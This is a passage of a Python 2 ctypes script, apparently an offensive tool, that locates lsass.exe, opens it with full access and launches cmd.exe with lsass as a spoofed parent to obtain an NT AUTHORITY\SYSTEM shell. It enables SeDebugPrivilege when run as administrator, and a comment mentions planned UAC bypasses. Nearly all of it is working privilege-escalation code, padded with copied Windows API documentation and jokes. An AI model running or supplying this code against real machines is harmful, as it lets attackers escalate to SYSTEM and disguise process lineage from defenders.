                           False,                                        # _In_      bInheritHandle        If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle.
                           ProcessId)                                    # _In_      dwProcessId           The identifier of the local process to be opened.
         if hProcess:
             ImageFileName = (c_char * MAX_PATH)()
             if GetProcessImageFileName(
                                 hProcess,                               # _In_      hProcess              A handle to the process. The handle must have the PROCESS_QUERY_INFORMATION or PROCESS_QUERY_LIMITED_INFORMATION access right
                                 ImageFileName,                          # _Out_     lpImageFileName       A pointer to a buffer that receives the full path to the executable file.
                                 MAX_PATH) > 0:                          # _In_      nSize                 The size of the lpImageFileName buffer, in characters.
                 filename = os.path.basename(ImageFileName.value)
                 systemprocess = "lsass.exe"                             #(Can't be killed like my desire for pizza)
                 if filename == systemprocess:
                      pid = ProcessId
                      print "\t[+] Find",systemprocess," to specify as PROC_THREAD_ATTRIBUTE_PARENT_PROCESS"
                      print "\t[+] PID of our to be Parent Process:", pid
             CloseHandle(hProcess)                                       # _In_      hObject              A valid handle to an open object.
     handle = OpenProcess(
                            PROCESS_ALL_ACCESS,                          # _In_      dwDesiredAccess       The access to the process object. This access right is checked against the security descriptor for the process. If the caller has enabled the SeDebugPrivilege privilege, the requested access is granted regardless of the contents of the security descriptor.
                            False,                                       # _In_      bInheritHandle        If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle
                            int(pid))                                    # _In_      dwProcessId           The identifier of the local process to be opened.
     if handle == 0:
          raise RuntimeError("Error in OpenProcess: %s" %GetLastError())
     print "\t[+] Aquired handle to ", systemprocess," process"
     Size = SIZE_T(0)
     InitializeProcThreadAttributeList(
                            None,                                        # _Out_opt_ lpAttributeList       The attribute list. This parameter can be NULL to determine the buffer size required to support the specified number of attributes.
                            1,                                           # _In_      dwAttributeCount      The count of attributes to be added to the list.
                            0,                                           # _Reserved_dwFlags               This parameter is reserved and must be zero.
                            byref(Size))                                 # _Inout_   lpSize                If lpAttributeList is NULL, this parameter receives the required buffer size in bytes. On output, this parameter receives the size in bytes of the initialized attribute list.
     if Size.value == 0:
        raise RuntimeError("Error in NULL InitializeProcThreadAttributeList: %s" %GetLastError())
     print "\t[+] Building empty attribute list"
     dwSize = len((BYTE * Size.value)())
     AttributeList = PROC_THREAD_ATTRIBUTE_LIST()
     knacrack420 = InitializeProcThreadAttributeList(
                            AttributeList,                               # _Out_opt_ lpAttributeList       The attribute list. This parameter can be NULL to determine the buffer size required to support the specified number of attributes.
                            1,                                           # _In_      dwAttributeCount      The count of attributes to be added to the list.
                            0,                                           # _Reserved_dwFlags               This parameter is reserved and must be zero.
                            byref(Size))                                 # _Inout_   lpSize                If lpAttributeList is not NULL, this parameter specifies the size in bytes of the lpAttributeList buffer on input. On output, this parameter receives the size in bytes of the initialized attribute list.

     if knacrack420 == 0:
            raise RuntimeError("Error in InitializeProcThreadAttributeList: %s" %GetLastError())
     print "\t[+] Size of memory block used to store attributes:", dwSize
     print '''\t[+] Since we now know buffer size for the specified number
            of attributes we allocate and initialize an actual AttributeList'''
     lpvalue = PVOID(handle)
     knacrack58008 = UpdateProcThreadAttribute(
                            AttributeList,                               # _Inout_   lpAttributeList       A pointer to an attribute list created by the InitializeProcThreadAttributeList function.
                            0,                                           # _In_      dwFlags               This parameter is reserved and must be zero.
                            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,        # _In_      Attribute             The attribute key to update in the attribute list. ~-> PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
                            byref(lpvalue),                              # _In_      lpValue               A pointer to the attribute value. This value should persist until the attribute is destroyed using the DeleteProcThreadAttributeList function.
                            sizeof(lpvalue),                             # _In_      cbSize                The size of the attribute value specified by the lpValue parameter.
                            None,                                        # _Out_opt_ lpPreviousValue       This parameter is reserved and must be NULL.
                            None)                                        # _In_opt_  lpReturnSize          This parameter is reserved and must be NULL.
     if knacrack58008 == 0:
            raise RuntimeError("Error in UpdateProcThreadAttribute")
     print "\t[+] Inheriting the handle of the privileged process for CreateProcess"
     lpStartupInfo = STARTUPINFOEX()                                      # https://blogs.msdn.microsoft.com/oldnewthing/20130426-00/?p=4543
     lpStartupInfo.StartupInfo.cb = sizeof(lpStartupInfo)                 # Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).
     lpStartupInfo.lpAttributeList = addressof(AttributeList)             # lpAttributeList | An attribute list. This list is created by the InitializeProcThreadAttributeList function.
     lpProcessInformation = PROCESS_INFORMATION()
     knacrack42069 = CreateProcess(
                            None,                                        # _In_opt_  lpApplicationName     The lpApplicationName parameter can be NULL. In that case, the module name must be the first white space–delimited token in the lpCommandLine string.
                            u"C:\\Windows\\System32\\cmd.exe",           # _Inout_opt lpCommandLine        The command line to be executed  # If PyInstaller use get_script_dir()
                            None,                                        # _In_opt_  pProcessAttributes    A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new process object can be inherited by child processes. If lpProcessAttributes is NULL, the handle cannot be inherited.
                            None,                                        # _In_opt_  lpThreadAttributes    A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new thread object can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited.
                            0,                                           # _In_      bInheritHandles       If this parameter is TRUE, each inheritable handle in the calling process is inherited by the new process. If the parameter is FALSE, the handles are not inherited. Note that inherited handles have the same value and access rights as the original handles.
                            (CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT),#_In_dwCreationFlags       The flags that control the priority class and the creation of the process # To specify these attributes when creating a process, specify EXTENDED_STARTUPINFO_PRESENT in the dwCreationFlag parameter and a STARTUPINFOEX structure in the lpStartupInfo parameter
                            None,                                        # _In_opt_  lpEnvironment         A pointer to the environment block for the new process. If this parameter is NULL, the new process uses the environment of the calling process.
                            None,                                        # _In_opt_  lpCurrentDirectory    The full path to the current directory for the process. If this parameter is NULL, the new process will have the same current drive and directory as the calling process
                            byref(lpStartupInfo),                        # _In_      lpStartupInfo         A pointer to a STARTUPINFO or STARTUPINFOEX structure.To set extended attributes, use a STARTUPINFOEX structure and specify EXTENDED_STARTUPINFO_PRESENT in the dwCreationFlags parameter.
                            byref(lpProcessInformation))                 # _Out_     lpProcessInformation  A pointer to a PROCESS_INFORMATION structure that receives identification information about the new process.
     if knacrack42069 == 0:
         raise RuntimeError("Error in specifying privileged parent process in CreateProc: %s" %GetLastError())
     print "\t[+] Should get a nice neat NT AUTHORITY\SYSTEM PID:", lpProcessInformation.dwProcessId
     CloseHandle(handle)                                                 # _In_      hObject              A valid handle to an open object
     DeleteProcThreadAttributeList(AttributeList)                        # _Inout_   lpAttributeList      The attribute list. This list is created by the InitializeProcThreadAttributeList function.

if areAdminRightsEnabled():
     grantprivilege(SE_DEBUG_NAME)
     ntshell()
else:
     print "\t This method requires Administrative Privileges, sorry... :( "  # (or wait for the implementation of various UAC bypasses I'll make)
